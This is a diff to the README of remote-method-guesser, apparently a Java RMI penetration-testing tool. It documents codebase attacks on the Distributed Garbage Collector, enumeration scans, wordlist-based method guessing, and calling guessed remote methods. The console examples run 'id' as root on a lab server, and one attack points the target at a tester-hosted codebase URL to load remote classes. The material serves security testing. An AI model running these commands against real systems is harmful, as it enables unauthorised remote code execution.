@@ -169,6 +169,39 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+When performing codebase attacks on the *Distributed Garbage Collector*, the response can contain a confusing error message:
+
+```console
+[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 Example 172.17.0.1:8000 --component dgc --stack-trace
+[+] Attempting codebase attack on DGC endpoint...
+[+] Using class Example with codebase http://172.17.0.1:8000/ during clean call.
+[+]
+[-] 	Caught unexpected AccessControlException during clean call.
+[-] 	The servers SecurityManager may refused the operation.
+[-]
+[-] 	StackTrace:
+java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:
+	java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
+	java.lang.ClassNotFoundException: access to class loader denied
+	[...]
+Caused by: java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
+	java.lang.ClassNotFoundException: access to class loader denied
+	[...]
+Caused by: java.lang.ClassNotFoundException: access to class loader denied
+	[...]
+Caused by: java.security.AccessControlException: access denied ("java.net.SocketPermission" "iinsecure.dev:80" "connect,resolve")
+	at java.security.AccessControlContext.checkPermission(Unknown Source)
+	[...]
+```
+
+The message that access to the class loader is denied and the fact that the *DGC* requests *connect* and
+*resolve* permissions looks like it would actually respect the user specified codebase. However, this is not the case.
+As mentioned above, the *DGC* nowadays always runs with ``useCodebaseOnly=true`` and does not respect user defined settings.
+The crucial part in the above error message is the location from which the *DGC* want's to load the class: ``iinsecure.dev:80``.
+This is the server side codebase and not the codebase location that was specified on the command line. A setting of
+``useCodebaseOnly=false`` only ignores client specified codebases, whereas server codebases are still used. However, since
+the *DGC* uses it's own and very strict ``AccessControlContext``, you get the *access denied* error.
+
 
 ### Enum Action
 
@@ -271,7 +304,7 @@ While not being that useful without server access, a ``file`` based codebase sti
 be useful for other attacks as well.
 
 ```console
-[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 | rg "RMI server codebase" -A 3 
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 | rg "RMI server codebase" -A 3
 [+] RMI server codebase enumeration:
 [+]
 [+] 	- http://iinsecure.dev/well-hidden-development-folder/
@@ -297,7 +330,7 @@ outputs during its enumeration:
   *RMI endpoint* is out of date.
 
 ```console
-[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action string-marshalling 
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action string-marshalling
 [+] RMI server String unmarshalling enumeration:
 [+]
 [+] 	- Caught ClassNotFoundException during lookup call.
@@ -328,7 +361,7 @@ If this is not the case, you can still enumerate the *useCodebaseOnly* setting f
 method than ``lookup`` in the ``--registry-method`` option.
 
 ```console
-[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action codebase 
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action codebase
 [+] RMI server useCodebaseOnly enumeration:
 [+]
 [+] 	- Caught MalformedURLException during lookup call.
@@ -349,7 +382,7 @@ either of the following:
 * **Vulnerable**: The server is vulnerable (can be confirmed by using e.g. *rmg's* ``bind`` action.
 
 ```console
-[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action localhost-bypass 
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action localhost-bypass
 [+] RMI registry localhost bypass enumeration (CVE-2019-2684):
 [+]
 [+] 	- Caught NotBoundException during unbind call (unbind was accepeted).
@@ -364,14 +397,14 @@ The *security manager enumeration* is what other *RMI tools* do during their *co
 
 * **Current Default**: Is displayed when the enumeration is successful, independent of the result (*SecurityManager* present or not).
   Whether a *SecurityManager* is present can be read from the status message.
-* **Outdated**: During the *DGC* call that enumerates the *SecurityManager* setting, a malformed client side codebase is used. 
+* **Outdated**: During the *DGC* call that enumerates the *SecurityManager* setting, a malformed client side codebase is used.
   As explained in the [codebase-action](#codebase-action) section, this is usually pointless, but for very old *DGC* instances
   it can still work. The *DGC* when attempts to parse the malformed codebase and throws an exception. The endpoint is marked
   as **Outdated** in this case.
 
 
 ```console
-[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action security-manager 
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action security-manager
 [+] RMI Security Manager enumeration:
 [+]
 [+] 	- Security Manager rejected access to the class loader.
@@ -389,7 +422,7 @@ to the *DGC* and inspects the returned exception message. The corresponding resu
 * **Vulnerable**: The ``java.util.HashMap`` object was deserialized and the endpoint is vulnerable to deserialization attacks.
 
 ```console
-[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action jep290 
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action jep290
 [+] RMI server JEP290 enumeration:
 [+]
 [+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
@@ -411,7 +444,7 @@ Notice that for this enumeration technique to work from remote, the *RMI registr
 From localhost, you can also enumerate servers that use ``readString``, by using e.g. the ``--reg-method bind`` option.
 
 ```console
-[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action filter-bypass 
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action filter-bypass
 [+] RMI registry JEP290 bypass enmeration:
 [+]
 [+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
@@ -428,7 +461,7 @@ This enumeration tells you whether an activator instance is available on the tar
 * **Vulnerable**: An activator is present and allows deserialization and probably codebase attacks.
 
 ```console
-[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action activator 
+[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action activator
 [+] RMI ActivationSystem enumeration:
 [+]
 [+] 	- Caught IllegalArgumentException during activate call (activator is present).
@@ -446,40 +479,45 @@ to the remote server. This operation requires a wordlist that contains the corre
 following form:
 
 ```console
-[qtc@kali wordlists]$ head -n 5 /opt/remote-method-guesser/wordlists/rmg.txt
-boolean call(String dummy, String dummy2, String dummy3)
-boolean call(String dummy, String dummy2)
-boolean call(String dummy, String[] dummy2)
-boolean call(String dummy)
+[qtc@devbox ~]$ head -n 5 /tmp/wordlist.txt
 boolean call(String[] dummy)
+boolean call(String dummy)
+boolean call(String dummy, String[] dummy2)
+boolean call(String dummy, String dummy2)
+boolean call(String dummy, String dummy2, String dummy3)
 ```
 
-*remote-method-guesser* ships some default wordlists and expects them in the path ``/opt/remote-method-guesser/wordlists/``.
-You can change this path either by modifying the [rmg configuration file](./src/config.properties) or by using the ``--wordlist-file``
-or ``--wordlist-folder`` options. Methods with zero arguments are skipped by default. You can enable them by using the
-``--zero-arg`` option. However, keep in mind that zero argument methods lead to real method calls on the server side, as their
-invocation cannot be prevented by using invalid argument types.
+*remote-method-guesser* ships some default wordlists that are included in the executable jar file.
+Modifying the default wordlists can be done via the [rmg configuration file](./src/config.properties) and rebuilding the project.
+To dynamically choose a different wordlist file you can use the``--wordlist-file`` or ``--wordlist-folder`` options.
+The default wordlists are stored in an optimized wordlist format. *remote-method-guesser* updates custom wordlists to
+the optimized format when you run the ``guess`` action with the ``--update`` option.
 
 ```console
-[qtc@devbox ~]$ rmg guess 172.17.0.2 1090 --ssl --zero-arg 
-[+] Reading method candidates from internal wordlist rmg.txt
+[qtc@devbox ~]$ head -n 5 /tmp/wordlist.txt
+boolean call(String[] dummy)
+boolean call(String dummy)
+boolean call(String dummy, String[] dummy2)
+boolean call(String dummy, String dummy2)
+boolean call(String dummy, String dummy2, String dummy3)
+
+[qtc@devbox ~]$ rmg guess 172.17.0.2 1090 --ssl --update --wordlist-file /tmp/wordlist.txt
+[+] Reading method candidates from file /tmp/wordlist.txt
 [+] 	752 methods were successfully parsed.
-[+] Reading method candidates from internal wordlist rmiscout.txt
-[+] 	2550 methods were successfully parsed.
+[+] 	Updating wordlist file.
 [+]
-[+] Starting Method Guessing on 3294 method signature(s).
+[+] Starting Method Guessing on 752 method signature(s).
 [+]
 [+] 	MethodGuesser is running:
 [+] 		--------------------------------
 [+] 		[ plain-server  ] HIT! Method with signature String execute(String dummy) exists!
 [+] 		[ plain-server  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
 [+] 		[ ssl-server    ] HIT! Method with signature String system(String[] dummy) exists!
-[+] 		[ ssl-server    ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
 [+] 		[ ssl-server    ] HIT! Method with signature int execute(String dummy) exists!
 [+] 		[ secure-server ] HIT! Method with signature void logMessage(int dummy1, Object dummy2) exists!
 [+] 		[ secure-server ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!
 [+] 		[ secure-server ] HIT! Method with signature void updatePreferences(java.util.ArrayList dummy1) exists!
-[+] 		[9882 / 9882] [#####################################] 100%
+[+] 		[2256 / 2256] [#####################################] 100%
 [+] 	done.
 [+]
 [+] Listing successfully guessed methods:
@@ -489,25 +527,81 @@ invocation cannot be prevented by using invalid argument types.
 [+] 		--> String system(String dummy, String[] dummy2)
 [+] 	- ssl-server
 [+] 		--> String system(String[] dummy)
-[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
 [+] 		--> int execute(String dummy)
 [+] 	- secure-server
 [+] 		--> void logMessage(int dummy1, Object dummy2)
 [+] 		--> String login(java.util.HashMap dummy1)
 [+] 		--> void updatePreferences(java.util.ArrayList dummy1)
+
+[qtc@devbox ~]$ head -n 5 /tmp/wordlist.txt
+String call(String dummy); 6072772491684722760; 0; false
+String call(String dummy, String dummy2); -5340760563417170050; 0; false
+String call(String dummy, String dummy2, String dummy3); -6078616129276353442; 0; false
+String call(String dummy, String[] dummy2); 6278640985022911931; 0; false
+String call(String[] dummy); 7759068303290927030; 0; false
 ```
 
-To reduce the overhead of dynamic class generation, *rmg* also supports an optimized wordlist format that
-contains the pre-computed method hashes and some meta information about the methods.
+*remote-method-guesser's* uses invalid argument types during method calls. This allows to identify valid method signatures while
+not leading to real method invocations on the server side. Methods with zero arguments are skipped by default. You can enable them
+by using the ``--zero-arg`` option. However, keep in mind that zero argument methods lead to real method calls on the server side,
+as their invocation cannot be prevented by using invalid argument types.
+
+When methods have been successfully guessed, you may want to invoke them using regular *RMI* calls (e.g. ``String execute(String dummy)``
+from above). The preferred way of doing this is by using *remote-method-guesser's* call action:
 
 ```console
-[qtc@kali wordlists]$ head -n 5 rmg.txt 
-boolean call(String dummy, String dummy2, String dummy3); 2142673766403641873; false; false
-boolean call(String dummy, String dummy2); -9048491806834107285; false; false
-boolean call(String dummy, String[] dummy2); 7952470873340381142; false; false
-boolean call(String dummy); -5603201874062960450; false; false
-boolean call(String[] dummy); -4301784332653484516; false; false
+[qtc@devbox remote-method-guesser]$ rmg call --ssl 172.17.0.2 1090 '"id"' --signature "String execute(String dummy)" --bound-name plain-server --plugin GenericPrint.har
+[+] uid=0(root) gid=0(root) groups=0(root)
 ```
 
-To transform a plain wordlist file into the optimized format, just use the ``--update`` option during the ``guess``
-operation. This will update all currently used wordlist files to the optimized format.
+However, *remote-method-guesser* can also dynamically create some *Java* code that can be used to call the identified methods.
+To use the dynamic code generation, just specify the ``--create-samples`` option during the ``guess`` action.
+
+```console
+[qtc@devbox ~]$ rmg guess --ssl 172.17.0.2 1090 --signature "String execute(String dummy)" --bound-name plain-server --create-samples
+[+] Starting Method Guessing on 1 method signature(s).
+[+] Method signature: String execute(String dummy).
+[+]
+[+] 	MethodGuesser is running:
+[+] 		--------------------------------
+[+] 		[ plain-server ] HIT! Method with signature String execute(String dummy) exists!
+[+] 		[1 / 1] [#####################################] 100%
+[+] 	done.
+[+]
+[+] Listing successfully guessed methods:
+[+]
+[+] 	- plain-server
+[+] 		--> String execute(String dummy)
+[+]
+[+] Starting creation of sample files:
+[+]
+[+] 	Sample folder /home/qtc/rmg-samples does not exist.
+[+] 	Creating sample folder.
+[+]
+[+] 	Creating samples for bound name plain-server.
+[+] 		Writing sample file /home/qtc/rmg-samples/plain-server/IPlainServer.java
+[+] 		Writing sample file /home/qtc/rmg-samples/plain-server/execute/execute.java
+```
+
+To use the dynamically create *Java* code, first compile the interface class (``IPlainServer.java``).
+Then adjust the argument values for your call in the method class (``execute.java``):
+
+```console
+[qtc@devbox ~]$ cd rmg-samples/plain-server/
+[qtc@devbox plain-server]$ ls
+execute  IPlainServer.java
+[qtc@devbox plain-server]$ javac IPlainServer.java -d execute/
+[qtc@devbox plain-server]$ cd execute/
+[qtc@devbox execute]$ rg 'TODO' execute.java
+100:            java.lang.String argument0 = TODO;
+[qtc@devbox execute]$ sed -i 's/TODO/"id"/' execute.java
+[qtc@devbox execute]$ javac execute.java
+[qtc@devbox execute]$ java execute
+[+] Connecting to registry on 172.17.0.2:1090... done!
+[+] Starting lookup on plain-server...
+[+] RMI object tries to connect to different remote host: iinsecure.dev
+[+]	Redirecting the connection back to 172.17.0.2...
+[+]	This is done for all further requests. This message is not shown again.
+[+] Invoking method execute... done!
+[+] The servers response is: uid=0(root) gid=0(root) groups=0(root)
+```
